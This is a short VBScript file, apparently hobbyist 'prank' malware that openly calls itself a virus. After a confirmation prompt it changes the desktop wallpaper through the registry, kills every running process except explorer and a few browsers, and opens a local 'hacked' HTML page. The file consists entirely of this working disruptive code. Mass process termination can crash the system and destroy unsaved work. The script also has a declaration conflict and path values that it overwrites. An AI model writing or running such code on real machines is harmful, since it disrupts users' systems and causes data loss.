Option Explicit

Dim wallpaperPath, htmlFilePath, Shell, answer
Dim excludedProcesses, IsInArray
Dim objWMIService, colProcesses, objProcess

excludedProcesses = Array("explorer.exe", "chrome.exe", "firefox.exe", "iexplore.exe")

Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process")

Dim scriptDir
scriptDir = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\"))

wallpaperPath = scriptDir & "matrix.png"
htmlFilePath = scriptDir & "hacked.html"

Set Shell = CreateObject("WScript.Shell")

answer = MsgBox("WARNING: THIS VIRUS CAN HARM TO YOUR COMPUTER, DO YOU WANT TO RUN THIS MALWARE?", vbExclamation + vbYesNo, "WARNING")

' Function to check if an element is in an array
Function IsInArray(item, arr)
    Dim i
    For i = 0 To UBound(arr)
        If LCase(arr(i)) = LCase(item) Then
            IsInArray = True
            Exit Function
        End If
    Next
    IsInArray = False
End Function

Function runVirus()
    wallpaperPath = scriptDir & "Wallpaper.jpg"
    htmlFilePath = scriptDir & "File.html"

    Shell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", wallpaperPath
    Shell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True

    For Each objProcess in colProcesses
        If Not IsInArray(objProcess.Name, excludedProcesses) And Not LCase(objProcess.Name) = "explorer.exe" Then
            objProcess.Terminate
        End If
    Next

    Shell.Run """" & htmlFilePath & """", 1, False
End Function

If answer = vbYes Then
    runVirus()
End If

Set Shell = Nothing
